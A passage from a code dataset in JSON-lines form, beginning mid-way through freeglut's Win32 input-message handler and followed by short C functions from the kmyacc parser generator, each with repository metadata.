ReleaseCapture () ;\n\n        if( ! FETCH_WCB( *window, Mouse ) )\n            break;\n\n        fgSetWindow( window );\n        fgState.Modifiers = fghGetWin32Modifiers( );\n\n        INVOKE_WCB(\n            *window, Mouse,\n            ( button,\n              pressed ? GLUT_DOWN : GLUT_UP,\n              window->State.MouseX,\n              window->State.MouseY\n            )\n        );\n\n        fgState.Modifiers = INVALID_MODIFIERS;\n    }\n    break;\n\n    case 0x020a:\n        /* Should be WM_MOUSEWHEEL but my compiler doesn't recognize it */\n    {\n        int wheel_number = LOWORD( wParam );\n        short ticks = ( short )HIWORD( wParam );\n\t\tfgState.MouseWheelTicks += ticks;\n\n        /*\n         * XXX Should use WHEEL_DELTA instead of 120\n         */\n\t\tif ( abs ( fgState.MouseWheelTicks ) > 120 )\n\t\t{\n\t\t\tint direction = ( fgState.MouseWheelTicks > 0 ) ? 1 : -1;\n\n            if( ! FETCH_WCB( *window, MouseWheel ) &&\n                ! FETCH_WCB( *window, Mouse ) )\n                break;\n\n            fgSetWindow( window );\n            fgState.Modifiers = fghGetWin32Modifiers( );\n\n            /*\n             * XXX Should use WHEEL_DELTA instead of 120\n             */\n            while( abs ( fgState.MouseWheelTicks ) > 120 )\n\t\t\t{\n                if( FETCH_WCB( *window, MouseWheel ) )\n                    INVOKE_WCB( *window, MouseWheel,\n                                ( wheel_number,\n                                  direction,\n                                  window->State.MouseX,\n                                  window->State.MouseY\n                                )\n                    );\n                else  /* No mouse wheel, call the mouse button callback twice */\n\t\t\t\t{\n                    /*\n                     * Map wheel zero to button 3 and 4; +1 to 3, -1 to 4\n                     *  \"    \"   one                     +1 to 5, -1 to 6, ...\n                     *\n                     * XXX The below assumes that you have no more than 3 mouse\n                     * XXX buttons.  Sorry.\n                     */\n                    int button = wheel_number * 2 + 3;\n                    if( direction < 0 )\n                        ++button;\n                    INVOKE_WCB( *window, Mouse,\n                                ( button, GLUT_DOWN,\n                                  window->State.MouseX, window->State.MouseY )\n                    );\n                    INVOKE_WCB( *window, Mouse,\n                                ( button, GLUT_UP,\n                                  window->State.MouseX, window->State.MouseY )\n                    );\n\t\t\t\t}\n\n                /*\n                 * XXX Should use WHEEL_DELTA instead of 120\n                 */\n\t\t\t\tfgState.MouseWheelTicks -= 120 * direction;\n\t\t\t}\n\n            fgState.Modifiers = INVALID_MODIFIERS;\n\t\t}\n    }\n    break ;\n\n    case WM_SYSKEYDOWN:\n    case WM_KEYDOWN:\n    {\n        int keypress = -1;\n        POINT mouse_pos ;\n\n        if( ( fgState.KeyRepeat==GLUT_KEY_REPEAT_OFF || window->State.IgnoreKeyRepeat==GL_TRUE ) && (HIWORD(lParam) & KF_REPEAT) )\n            break;\n\n        /*\n         * Remember the current modifiers state. This is done here in order\n         * to make sure the VK_DELETE keyboard callback is executed properly.\n         */\n        fgState.Modifiers = fghGetWin32Modifiers( );\n\n        GetCursorPos( &mouse_pos );\n        ScreenToClient( window->Window.Handle, &mouse_pos );\n\n        window->State.MouseX = mouse_pos.x;\n        window->State.MouseY = mouse_pos.y;\n\n        /* Convert the Win32 keystroke codes to GLUTtish way */\n#       define KEY(a,b) case a: keypress = b; break;\n\n        switch( wParam )\n        {\n            KEY( VK_F1,     GLUT_KEY_F1        );\n            KEY( VK_F2,     GLUT_KEY_F2        );\n            KEY( VK_F3,     GLUT_KEY_F3        );\n            KEY( VK_F4,     GLUT_KEY_F4        );\n            KEY( VK_F5,     GLUT_KEY_F5        );\n            KEY( VK_F6,     GLUT_KEY_F6        );\n            KEY( VK_F7,     GLUT_KEY_F7        );\n            KEY( VK_F8,     GLUT_KEY_F8        );\n            KEY( VK_F9,     GLUT_KEY_F9        );\n            KEY( VK_F10,    GLUT_KEY_F10       );\n            KEY( VK_F11,    GLUT_KEY_F11       );\n            KEY( VK_F12,    GLUT_KEY_F12       );\n            KEY( VK_PRIOR,  GLUT_KEY_PAGE_UP   );\n            KEY( VK_NEXT,   GLUT_KEY_PAGE_DOWN );\n            KEY( VK_HOME,   GLUT_KEY_HOME      );\n            KEY( VK_END,    GLUT_KEY_END       );\n            KEY( VK_LEFT,   GLUT_KEY_LEFT      );\n            KEY( VK_UP,     GLUT_KEY_UP        );\n            KEY( VK_RIGHT,  GLUT_KEY_RIGHT     );\n            KEY( VK_DOWN,   GLUT_KEY_DOWN      );\n            KEY( VK_INSERT, GLUT_KEY_INSERT    );\n            KEY( VK_LCONTROL, GLUT_KEY_CTRL_L  );\n            KEY( VK_RCONTROL, GLUT_KEY_CTRL_R  );\n            KEY( VK_LSHIFT, GLUT_KEY_SHIFT_L   );\n            KEY( VK_RSHIFT, GLUT_KEY_SHIFT_R   );\n            KEY( VK_LMENU,  GLUT_KEY_ALT_L     );\n            KEY( VK_RMENU,  GLUT_KEY_ALT_R     );\n\n        case VK_DELETE:\n            /* The delete key should be treated as an ASCII keypress: */\n            INVOKE_WCB( *window, Keyboard,\n                        ( 127, window->State.MouseX, window->State.MouseY )\n            );\n        }\n\n#if defined(_WIN32_WCE)\n        if(!(lParam & 0x40000000)) /* Prevent auto-repeat */\n        {\n            if(wParam==(unsigned)gxKeyList.vkRight)\n                keypress = GLUT_KEY_RIGHT;\n            else if(wParam==(unsigned)gxKeyList.vkLeft)\n                keypress = GLUT_KEY_LEFT;\n            else if(wParam==(unsigned)gxKeyList.vkUp)\n                keypress = GLUT_KEY_UP;\n            else if(wParam==(unsigned)gxKeyList.vkDown)\n                keypress = GLUT_KEY_DOWN;\n            else if(wParam==(unsigned)gxKeyList.vkA)\n                keypress = GLUT_KEY_F1;\n            else if(wParam==(unsigned)gxKeyList.vkB)\n                keypress = GLUT_KEY_F2;\n            else if(wParam==(unsigned)gxKeyList.vkC)\n                keypress = GLUT_KEY_F3;\n            else if(wParam==(unsigned)gxKeyList.vkStart)\n                keypress = GLUT_KEY_F4;\n        }\n#endif\n\n        if( keypress != -1 )\n            INVOKE_WCB( *window, Special,\n                        ( keypress,\n                          window->State.MouseX, window->State.MouseY )\n            );\n\n        fgState.Modifiers = INVALID_MODIFIERS;\n    }\n    break;\n\n    case WM_SYSKEYUP:\n    case WM_KEYUP:\n    {\n        int keypress = -1;\n        POINT mouse_pos;\n\n        /*\n         * Remember the current modifiers state. This is done here in order\n         * to make sure the VK_DELETE keyboard callback is executed properly.\n         */\n        fgState.Modifiers = fghGetWin32Modifiers( );\n\n        GetCursorPos( &mouse_pos );\n        ScreenToClient( window->Window.Handle, &mouse_pos );\n\n        window->State.MouseX = mouse_pos.x;\n        window->State.MouseY = mouse_pos.y;\n\n        /*\n         * Convert the Win32 keystroke codes to GLUTtish way.\n         * \"KEY(a,b)\" was defined under \"WM_KEYDOWN\"\n         */\n\n        switch( wParam )\n        {\n            KEY( VK_F1,     GLUT_KEY_F1        );\n            KEY( VK_F2,     GLUT_KEY_F2        );\n            KEY( VK_F3,     GLUT_KEY_F3        );\n            KEY( VK_F4,     GLUT_KEY_F4        );\n            KEY( VK_F5,     GLUT_KEY_F5        );\n            KEY( VK_F6,     GLUT_KEY_F6        );\n            KEY( VK_F7,     GLUT_KEY_F7        );\n            KEY( VK_F8,     GLUT_KEY_F8        );\n            KEY( VK_F9,     GLUT_KEY_F9        );\n            KEY( VK_F10,    GLUT_KEY_F10       );\n            KEY( VK_F11,    GLUT_KEY_F11       );\n            KEY( VK_F12,    GLUT_KEY_F12       );\n            KEY( VK_PRIOR,  GLUT_KEY_PAGE_UP   );\n            KEY( VK_NEXT,   GLUT_KEY_PAGE_DOWN );\n            KEY( VK_HOME,   GLUT_KEY_HOME      );\n            KEY( VK_END,    GLUT_KEY_END       );\n            KEY( VK_LEFT,   GLUT_KEY_LEFT      );\n            KEY( VK_UP,     GLUT_KEY_UP        );\n            KEY( VK_RIGHT,  GLUT_KEY_RIGHT     );\n            KEY( VK_DOWN,   GLUT_KEY_DOWN      );\n            KEY( VK_INSERT, GLUT_KEY_INSERT    );\n            KEY( VK_LCONTROL, GLUT_KEY_CTRL_L  );\n            KEY( VK_RCONTROL, GLUT_KEY_CTRL_R  );\n            KEY( VK_LSHIFT, GLUT_KEY_SHIFT_L   );\n            KEY( VK_RSHIFT, GLUT_KEY_SHIFT_R   );\n            KEY( VK_LMENU,  GLUT_KEY_ALT_L     );\n            KEY( VK_RMENU,  GLUT_KEY_ALT_R     );\n\n          case VK_DELETE:\n              /* The delete key should be treated as an ASCII keypress: */\n              INVOKE_WCB( *window, KeyboardUp,\n                          ( 127, window->State.MouseX, window->State.MouseY )\n              );\n              break;\n\n        default:\n        {\n#if !defined(_WIN32_WCE)\n            BYTE state[ 256 ];\n            WORD code[ 2 ];\n\n            GetKeyboardState( state );\n\n            if( ToAscii( (UINT)wParam, 0, state, code, 0 ) == 1 )\n                wParam=code[ 0 ];\n\n            INVOKE_WCB( *window, KeyboardUp,\n                        ( (char)wParam,\n                          window->State.MouseX, window->State.MouseY )\n            );\n#endif /* !defined(_WIN32_WCE) */\n        }\n        }\n\n        if( keypress != -1 )\n            INVOKE_WCB( *window, SpecialUp,\n                        ( keypress,\n                          window->State.MouseX, window->State.MouseY )\n            );\n\n        fgState.Modifiers = INVALID_MODIFIERS;\n    }\n    break;\n\n    case WM_SYSCHAR:\n    case WM_CHAR:\n    {\n      if( (fgState.KeyRepeat==GLUT_KEY_REPEAT_OFF || window->State.IgnoreKeyRepeat==GL_TRUE) && (HIWORD(lParam) & KF_REPEAT) )\n            break;\n\n        fgState.Modifiers = fghGetWin32Modifiers( );\n        INVOKE_WCB( *window, Keyboard,\n                    ( (char)wParam,\n                      window->State.MouseX, window->State.MouseY )\n        );\n        fgState.Modifiers = INVALID_MODIFIERS;\n    }\n    break;\n\n    case WM_CAPTURECHANGED:\n        /* User has finished resizing the window, force a redraw */\n        INVOKE_WCB( *window, Display, ( ) );\n\n        /*lRet = DefWindowProc( hWnd, uMsg, wParam, lParam ); */\n        break;\n\n        /* Other messages that I have seen and which are not handled already */\n    case WM_SETTEXT:  /* 0x000c */\n        lRet = DefWindowProc( hWnd, uMsg, wParam, lParam );\n        /* Pass it on to \"DefWindowProc\" to set the window text */\n        break;\n\n    case WM_GETTEXT:  /* 0x000d */\n        /* Ideally we would copy the title of the window into \"lParam\" */\n        /* strncpy ( (char *)lParam, \"Window Title\", wParam );\n           lRet = ( wParam > 12 ) ? 12 : wParam;  */\n        /* the number of characters copied */\n        lRet = DefWindowProc( hWnd, uMsg, wParam, lParam );\n        break;\n\n    case WM_GETTEXTLENGTH:  /* 0x000e */\n        /* Ideally we would get the length of the title of the window */\n        lRet = 12;\n        /* the number of characters in \"Window Title\\0\" (see above) */\n        break;\n\n    case WM_ERASEBKGND:  /* 0x0014 */\n        lRet = DefWindowProc( hWnd, uMsg, wParam, lParam );\n        break;\n\n#if !defined(_WIN32_WCE)\n    case WM_SYNCPAINT:  /* 0x0088 */\n        /* Another window has moved, need to update this one */\n        window->State.Redisplay = GL_TRUE;\n        lRet = DefWindowProc( hWnd, uMsg, wParam, lParam );\n        /* Help screen says this message must be passed to \"DefWindowProc\" */\n        break;\n\n    case WM_NCPAINT:  /* 0x0085 */\n      /* Need to update the border of this window */\n        lRet = DefWindowProc( hWnd, uMsg, wParam, lParam );\n        /* Pass it on to \"DefWindowProc\" to repaint a standard border */\n        break;\n\n    case WM_SYSCOMMAND :  /* 0x0112 */\n        {\n          /*\n           * We have received a system command message.  Try to act on it.\n           * The commands are passed in through the \"wParam\" parameter:\n           * The least significant digit seems to be which edge of the window\n           * is being used for a resize event:\n           *     4  3  5\n           *     1     2\n           *     7  6  8\n           * Congratulations and thanks to Richard Rauch for figuring this out..\n           */\n            switch ( wParam & 0xfff0 )\n            {\n            case SC_SIZE       :\n                break ;\n\n            case SC_MOVE       :\n                break ;\n\n            case SC_MINIMIZE   :\n                /* User has clicked on the \"-\" to minimize the window */\n                /* Turn off the visibility */\n                window->State.Visible = GL_FALSE ;\n\n                break ;\n\n            case SC_MAXIMIZE   :\n                break ;\n\n            case SC_NEXTWINDOW :\n                break ;\n\n            case SC_PREVWINDOW :\n                break ;\n\n            case SC_CLOSE      :\n                /* Followed very closely by a WM_CLOSE message */\n                break ;\n\n            case SC_VSCROLL    :\n                break ;\n\n            case SC_HSCROLL    :\n                break ;\n\n            case SC_MOUSEMENU  :\n                break ;\n\n            case SC_KEYMENU    :\n                break ;\n\n            case SC_ARRANGE    :\n                break ;\n\n            case SC_RESTORE    :\n                break ;\n\n            case SC_TASKLIST   :\n                break ;\n\n            case SC_SCREENSAVE :\n                break ;\n\n            case SC_HOTKEY     :\n                break ;\n\n#if(WINVER >= 0x0400)\n            case SC_DEFAULT    :\n                break ;\n\n            case SC_MONITORPOWER    :\n                break ;\n\n            case SC_CONTEXTHELP    :\n                break ;\n#endif /* WINVER >= 0x0400 */\n\n            default:\n#if _DEBUG\n                fgWarning( \"Unknown wParam type 0x%x\", wParam );\n#endif\n                break;\n            }\n        }\n#endif /* !defined(_WIN32_WCE) */\n\n        /* We need to pass the message on to the operating system as well */\n        lRet = DefWindowProc( hWnd, uMsg, wParam, lParam );\n        break;\n\n#ifdef WM_TOUCH\n\t/* handle multi-touch messages */\n\tcase WM_TOUCH:\n\t{\n\t\tunsigned int numInputs = (unsigned int)wParam;\n\t\tunsigned int i = 0;\n\t\tTOUCHINPUT* ti = (TOUCHINPUT*)malloc( sizeof(TOUCHINPUT)*numInputs);\n\n\t\tif (fghGetTouchInputInfo == (pGetTouchInputInfo)0xDEADBEEF) {\n\t\t    fghGetTouchInputInfo = (pGetTouchInputInfo)GetProcAddress(GetModuleHandle(\"user32\"),\"GetTouchInputInfo\");\n\t\t    fghCloseTouchInputHandle = (pCloseTouchInputHandle)GetProcAddress(GetModuleHandle(\"user32\"),\"CloseTouchInputHandle\");\n\t\t}\n\n\t\tif (!fghGetTouchInputInfo) { \n\t\t\tfree( (void*)ti );\n\t\t\tbreak;\n\t\t}\n\n\t\tif (fghGetTouchInputInfo( (HTOUCHINPUT)lParam, numInputs, ti, sizeof(TOUCHINPUT) )) {\n\t\t\t/* Handle each contact point */\n\t\t\tfor (i = 0; i < numInputs; ++i ) {\n\n\t\t\t\tPOINT tp;\n\t\t\t\ttp.x = TOUCH_COORD_TO_PIXEL(ti[i].x);\n\t\t\t\ttp.y = TOUCH_COORD_TO_PIXEL(ti[i].y);\n\t\t\t\tScreenToClient( hWnd, &tp );\n\n\t\t\t\tti[i].dwID = ti[i].dwID * 2;\n\n\t\t\t\tif (ti[i].dwFlags & TOUCHEVENTF_DOWN) {\n\t\t\t\t\tINVOKE_WCB( *window, MultiEntry,  ( ti[i].dwID, GLUT_ENTERED ) );\n\t\t\t\t\tINVOKE_WCB( *window, MultiButton, ( ti[i].dwID, tp.x, tp.y, 0, GLUT_DOWN ) );\n\t\t\t\t} else if (ti[i].dwFlags & TOUCHEVENTF_MOVE) {\n\t\t\t\t\tINVOKE_WCB( *window, MultiMotion, ( ti[i].dwID, tp.x, tp.y ) );\n\t\t\t\t} else if (ti[i].dwFlags & TOUCHEVENTF_UP)   { \n\t\t\t\t\tINVOKE_WCB( *window, MultiButton, ( ti[i].dwID, tp.x, tp.y, 0, GLUT_UP ) );\n\t\t\t\t\tINVOKE_WCB( *window, MultiEntry,  ( ti[i].dwID, GLUT_LEFT ) );\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tfghCloseTouchInputHandle((HTOUCHINPUT)lParam);\n\t\tfree( (void*)ti );\n\t\tlRet = 0; /*DefWindowProc( hWnd, uMsg, wParam, lParam );*/\n\t\tbreak;\n\t}\n#endif\n    default:\n        /* Handle unhandled messages */\n        lRet = DefWindowProc( hWnd, uMsg, wParam, lParam );\n        break;\n    }\n\n    return lRet;\n}", "path": "src\\freeglut\\freeglut_main.c", "repo_name": "jdupuy/ssgi", "stars": 47, "license": "None", "language": "c", "size": 700}
{"docstring": "/*\n * Error Messages.\n */\n", "func_signal": "void fgError( const char *fmt, ... )", "code": "{\n    va_list ap;\n\n    if (fgState.ErrorFunc) {\n\n        va_start( ap, fmt );\n\n        /* call user set error handler here */\n        fgState.ErrorFunc(fmt, ap);\n\n        va_end( ap );\n\n    } else {\n\n        va_start( ap, fmt );\n\n        fprintf( stderr, \"freeglut \");\n        if( fgState.ProgramName )\n            fprintf( stderr, \"(%s): \", fgState.ProgramName );\n        VFPRINTF( stderr, fmt, ap );\n        fprintf( stderr, \"\\n\" );\n\n        va_end( ap );\n\n        if ( fgState.Initialised )\n            fgDeinitialize ();\n\n        exit( 1 );\n    }\n}", "path": "src\\freeglut\\freeglut_main.c", "repo_name": "jdupuy/ssgi", "stars": 47, "license": "None", "language": "c", "size": 700}
{"docstring": "/*\n * Mark appropriate window to be displayed\n */\n", "func_signal": "void FGAPIENTRY glutPostWindowRedisplay( int windowID )", "code": "{\n    SFG_Window* window;\n\n    FREEGLUT_EXIT_IF_NOT_INITIALISED ( \"glutPostWindowRedisplay\" );\n    window = fgWindowByID( windowID );\n    freeglut_return_if_fail( window );\n    window->State.Redisplay = GL_TRUE;\n}", "path": "src\\freeglut\\freeglut_display.c", "repo_name": "jdupuy/ssgi", "stars": 47, "license": "None", "language": "c", "size": 700}
{"docstring": "/* Return length of production p */\n", "func_signal": "global int length(Gsym *p)", "code": "{\n  int n;\n    \n  for (n = 0; *++p; n++)\n    ;\n  return (n);\n}", "path": "src\\grammar.c", "repo_name": "moriyoshi/kmyacc-forked", "stars": 49, "license": "gpl-2.0", "language": "c", "size": 165}
{"docstring": "/* Copy string to flexible string */\n", "func_signal": "global void copy_flexstr(Flexstr *fap, char *str)", "code": "{\n  int n = strlen(str);\n  resize_flexstr(fap, n + 1);\n  strcpy(fap->body, str);\n  fap->length = n;\n}", "path": "src\\misc.c", "repo_name": "moriyoshi/kmyacc-forked", "stars": 49, "license": "gpl-2.0", "language": "c", "size": 165}
{"docstring": "/* Process %union statement */\n", "func_signal": "void do_union()", "code": "{\n  Flexstr *flap;\n\n  union_lineno = lineno;\n  flap = get_block_body();\n  union_body = flap->body;\n}", "path": "src\\grammar.c", "repo_name": "moriyoshi/kmyacc-forked", "stars": 49, "license": "gpl-2.0", "language": "c", "size": 165}
{"docstring": "/* Process %type statement */\n", "func_signal": "void do_type()", "code": "{\n  Symbol *type, *p;\n  char t;\n    \n  type = gettype();\n  for (;;) {\n    if ((t = gettoken()) == ',')\n      continue;\n    if (!isgsym(t))\n      break;\n    p = gsym[intern_gsym(token_text, NO)];\n    if (type != NULL)\n      p->type = type;\n  }\n  ungettok();\n}", "path": "src\\grammar.c", "repo_name": "moriyoshi/kmyacc-forked", "stars": 49, "license": "gpl-2.0", "language": "c", "size": 165}
{"docstring": "/* Return value of C character sequence s */\n", "func_signal": "int charval(char *s)", "code": "{\n  int val;\n  int c;\n  int i;\n    \n  if ((c = *s++) != '\\\\')\n    return c;\n  c = *s++;\n  if (isoctal(c)) {\n    val = 0;\n    for (i = 0; isoctal(*s) && i < 3; i++)\n      val = val * 8 + *s++ - '0';\n    return val;\n  }\n  switch(c) {\n  case 'n': return '\\n';\n  case 't': return '\\t';\n  case 'b': return '\\b';\n  case 'r': return '\\r';\n  case 'f': return '\\f';\n  case 'v': return '\\013';\n  case 'a': return '\\007';\n  default:\n    error(\"Undefined escape sequence\");\n    worst_error = 1;\n    /* fall thru */\n  case '\\'':\n  case '\\\"':\n  case '\\\\':\n  case '\\?':\n    return c;\n  }\n}", "path": "src\\grammar.c", "repo_name": "moriyoshi/kmyacc-forked", "stars": 49, "license": "gpl-2.0", "language": "c", "size": 165}
{"docstring": "/* Read <typename> in %type/%token, etc.\n * return interned string between balanced <>.\n */\n", "func_signal": "Symbol *gettype()", "code": "{\n  char buf[256], *p, *ps;\n  int ct, left, len;\n  int t;\n\n  if (gettoken() != '<') {\n    ungettok();\n    return (NULL);\n  }\n  ct = 1;\n  p = ps = buf;\n  left = sizeof(buf) - 1;\n  t = gettoken();\n  for (;;) {\n    switch (t) {\n    case '\\n':\n    case EOF:\n      die(\"missing closing >\");\n      break;\n    case '<':\n      ct++;\n      break;\n    case '>':\n      ct--;\n      break;\n    }\n    if (ct == 0)\n      break;\n    len = strlen(token_text);\n    if (len > left)\n      die(\"type too long\");\n    strcpy(p, token_text);\n    p += len;\n    left -= len;\n    if (t != SPACE)\n      ps = p;\n\n    t = raw_gettoken();\n  }\n  *ps = '\\0';\n  unioned = YES;\n  return (intern(intern_token(buf)));\n}", "path": "src\\grammar.c", "repo_name": "moriyoshi/kmyacc-forked", "stars": 49, "license": "gpl-2.0", "language": "c", "size": 165}
{"docstring": "/* Return reversed list. */\n", "func_signal": "global List *nreverse(List *p)", "code": "{\n  List *q;\n\n  q = NULL;\n  while (p != NULL) {\n    List *w = p->next;\n    p->next = q;\n    q = p;\n    p = w;\n  }\n  return q;\n}", "path": "src\\misc.c", "repo_name": "moriyoshi/kmyacc-forked", "stars": 49, "license": "gpl-2.0", "language": "c", "size": 165}
{"docstring": "/* Process declaration part */\n", "func_signal": "global void do_declaration()", "code": "{\n  int t;\n  int i;\n  int val;\n\n  nterms = nnonts = 0;\n  intern_gsym(get_lang_id() == LANG_PHP ? \"EOF\" : \"$EOF\", YES);\n  gsym[0]->value = 0;\n  error_token = intern_gsym(intern_token(\"error\"), YES);\n  start_prime = intern_gsym(get_lang_id() == LANG_PHP ? \"start\" : \"$start\", NO);\n  start_sym = 0;\n  cur_prec = 0;\n  unioned = NO;\n  while ((t = gettoken()) != MARK) {\n    switch (t) {\n    case TOKEN:\n    case LEFT:\n    case RIGHT:\n    case NONASSOC:\n      do_token(t);\n      break;\n    case BEGININC:\n      do_copy();\n      break;\n    case UNION:\n      do_union();\n      unioned = YES;\n      break;\n    case TYPE:\n      do_type();\n      break;\n    case EXPECT:\n      if (gettoken() == NUMBER) {\n        expected_srconf = atoi(token_text);\n      } else {\n        die(\"Missing number\");\n      }\n      break;\n    case START:\n      gettoken();\n      start_sym = intern_gsym(token_text, NO);\n      break;\n    case PURE_PARSER:\n      pure_flag = YES;\n      break;\n    case EOF:\n      die(\"No grammar given\");\n      break;\n    default:\n      die1(M_SYNTAX, token_text);\n      break;\n    }\n  }\n\n  /* Assign values to tokens */\n  val = gsym[1]->value;\n  if (val > 0)\n    val++;\n  else\n    val = 256;\n  for (i = 1; i < nterms; i++) {\n    if (gsym[i]->value < 0)\n      gsym[i]->value = val++;\n  }\n}", "path": "src\\grammar.c", "repo_name": "moriyoshi/kmyacc-forked", "stars": 49, "license": "gpl-2.0", "language": "c", "size": 165}
{"docstring": "/* Open file fn with mode; exit if fail */\n", "func_signal": "global FILE *efopen(char *fn, char *mode)", "code": "{\n  FILE *fp;\n\n  if (strcmp(fn, \"-\") == 0) {\n    switch (*mode) {\n    case 'r': return stdin;\n    case 'w': return stdout;\n    }\n  }\n  if ((fp = fopen(fn, mode)) == NULL) {\n    fprintf(stderr, \"%s: \", progname);\n    perror(fn);\n    exit(1);\n  }\n  return (fp);\n}", "path": "src\\yacc.c", "repo_name": "moriyoshi/kmyacc-forked", "stars": 49, "license": "gpl-2.0", "language": "c", "size": 165}
{"docstring": "/* Return grammar id for string s, register if new */\n", "func_signal": "Gsym intern_gsym(char *s, bool term)", "code": "{\n  Symbol *p;\n    \n  p = intern(s);\n  if (p->code != NILSYM)\n    return (p->code);\n  if (term || p->name[0] == '\\'') {\n    if (nterms >= MAXTERM)\n      die(\"Too many terminals\");\n    gsym[nterms] = p;\n    p->code = nterms++;\n    p->assoc = A_UNDEF;\n    p->prec = 0;\n    p->type = NULL;\n    if (p->name[0] == '\\'') {\n      p->value = charval(p->name + 1);\n    } else {\n      p->value = -1;\n    }\n  } else {\n    if (nnonts >= MAXNONT)\n      die(\"Too many nonterminals\");\n    gsym[NB + nnonts] = p;\n    p->code = NB + nnonts++;\n    p->assoc = A_UNDEF;\n    p->prec = 0;\n    p->type = NULL;\n    p->value = -1;\n  }\n  return (p->code);\n}", "path": "src\\grammar.c", "repo_name": "moriyoshi/kmyacc-forked", "stars": 49, "license": "gpl-2.0", "language": "c", "size": 165}
{"docstring": "/* Read action */\n", "func_signal": "char *copyact(Gsym *g, int n, int delm, char *attrname[])", "code": "{\n  Flexstr *flap = new_flexstr(128);\n  int tok;\n  int ct, v, i;\n  Symbol *type;\n\n  ct = 0;\n  while ((tok = raw_gettoken()) != delm || ct > 0) {\n    switch (tok) {\n    case EOF:\n      die(\"Unexpected EOF\");\n      break;\n    case '{':\n      ct++;\n      break;\n    case '}':\n      ct--;\n      break;\n    case NAME:\n      if (!nflag)\n        break;\n      type = NULL;\n      v = -1;\n      for (i = 0; i <= n; i++) {\n        if (gsym[g[i]]->name == token_text) {\n          if (v < 0)\n            v = i;\n          else {\n            error1(\"ambiguous semantic value reference: '%s'\", token_text);\n            break;\n          }\n        }\n      }\n      if (v < 0) {\n        for (i = 0; i <= n; i++) {\n          if (attrname[i] == token_text) {\n            v = i;\n            break;\n          }\n        }\n        if (token_text == attrname[n + 1])\n          v = 0;\n      }\n      if (v >= 0) {\n        tok = (v == 0 ? '$' : 0);\n        goto semval;\n      }\n      break;\n    case '$':\n      if (iflag)\n        break;\n      type = NULL;\n      tok = raw_gettoken();\n      if (tok == '<') {\n        if (raw_gettoken() != NAME)\n          error(\"type expected\");\n        type = intern(token_text);\n        if (raw_gettoken() != '>')\n          error(\"missing >\");\n        tok = raw_gettoken();\n      }\n      v = 1;\n      if (tok == '$')\n        v = 0;\n      else if (tok == '-') {\n        tok = raw_gettoken();\n        if (tok != NUMBER)\n          error(\"number expected\");\n        else\n          v = -atoi(token_text);\n      }\n      else {\n        if (tok != NUMBER)\n          error(\"number expected\");\n        else {\n          v = atoi(token_text);\n          if (v > n) {\n            error(\"too big $N\");\n            v = 1;\n          }\n        }\n      }\n    semval:\n      if (type == NULL)\n        type = gsym[g[v]]->type;\n      if (type == NULL && unioned) {\n        error1(\"type not defined for `%s'\", gsym[g[v]]->name);\n        worst_error = 1;\n      }\n      append_flexstr\n        (flap, parser_dollar(tok, v, n, type ? type->name : NULL));\n      continue;\n    }\n    append_flexstr(flap, token_text);\n  }\n  return flap->body;\n}", "path": "src\\grammar.c", "repo_name": "moriyoshi/kmyacc-forked", "stars": 49, "license": "gpl-2.0", "language": "c", "size": 165}
{"docstring": "/* Compute preimages for each state */\n", "func_signal": "void comp_preimages()", "code": "{\n  int i, j;\n  Preimage **primv;\n\n  new_array(primv, nstates);\n  for (i = 0; i < nstates; i++) {\n    primv[i] = talloc(sizeof(Preimage));\n    primv[i]->index = i;\n    primv[i]->len = 0;\n  }\n\n  for (i = 0; i < nclasses; i++) {\n    for (j = 0; j < nterms; j++) {\n      int s = class_action[i][j];\n      if (s > 0)\n        primv[s]->len++;\n    }\n  }\n  for (i = 0; i < nstates; i++) {\n    new_array(primv[i]->classes, primv[i]->len);\n    primv[i]->len = 0;\n  }\n  for (i = 0; i < nclasses; i++) {\n    for (j = 0; j < nterms; j++) {\n      int s = class_action[i][j];\n      if (s > 0)\n        primv[s]->classes[primv[s]->len++] = i;\n    }\n  }\n\n  qsort(primv, nstates, sizeof(primv[0]), qcmp_preimage);\n\n  new_array(primof, nstates);\n  new_array(prims, nstates);\n  nprims = 0;\n  for (i = 0; i < nstates; ) {\n    struct preimage *p = primv[i];\n    prims[nprims] = p;\n    for (; i < nstates && cmp_preimage(p, primv[i]) == 0; i++)\n      primof[primv[i]->index] = p;\n    p->index = nprims++;\n  }\n}", "path": "src\\compress.c", "repo_name": "moriyoshi/kmyacc-forked", "stars": 49, "license": "gpl-2.0", "language": "c", "size": 165}
{"docstring": "/* Return a symbol which corresponds to string s */\n", "func_signal": "Symbol *intern(char *s)", "code": "{\n  Symbol *p, **root;\n    \n  root = hashtbl + (hash(s) % HASHSIZE);\n  for (p = *root; p != NULL; p = p->next) {\n    if (p->name == s)\n      return (p);\n  }\n  p = alloc(sizeof(Symbol) + strlen(s));\n  p->next = *root;\n  *root = p;\n  p->name = s;\n  p->code = NILSYM;\n  return (p);\n}", "path": "src\\grammar.c", "repo_name": "moriyoshi/kmyacc-forked", "stars": 49, "license": "gpl-2.0", "language": "c", "size": 165}
{"docstring": "/* global */\n", "func_signal": "void *emalloc(int size)", "code": "{\n  void *p = malloc(size);\n  if (p == NULL)\n    die(\"Out of memory\");\n  return p;\n}", "path": "src\\misc.c", "repo_name": "moriyoshi/kmyacc-forked", "stars": 49, "license": "gpl-2.0", "language": "c", "size": 165}
{"docstring": "/* Create flexible array object */\n", "func_signal": "global Flexstr *new_flexstr(int defaultsize)", "code": "{\n  Flexstr *fap = emalloc(sizeof(Flexstr));\n  fap->alloc_size = defaultsize;\n  assert(fap->alloc_size >= 1);\n  fap->body = emalloc(defaultsize);\n  fap->body[0] = '\\0';\n  fap->length = 0;\n  return fap;\n}", "path": "src\\misc.c", "repo_name": "moriyoshi/kmyacc-forked", "stars": 49, "license": "gpl-2.0", "language": "c", "size": 165}
{"docstring": "/* Return unique nonterminal id */\n", "func_signal": "Gsym gen_nont()", "code": "{\n  static int n = 1;\n  char buf[6];\n    \n  sprintf(buf, \"@%d\", n++);\n  return (intern_gsym(intern_token(buf), NO));\n}", "path": "src\\grammar.c", "repo_name": "moriyoshi/kmyacc-forked", "stars": 49, "license": "gpl-2.0", "language": "c", "size": 165}
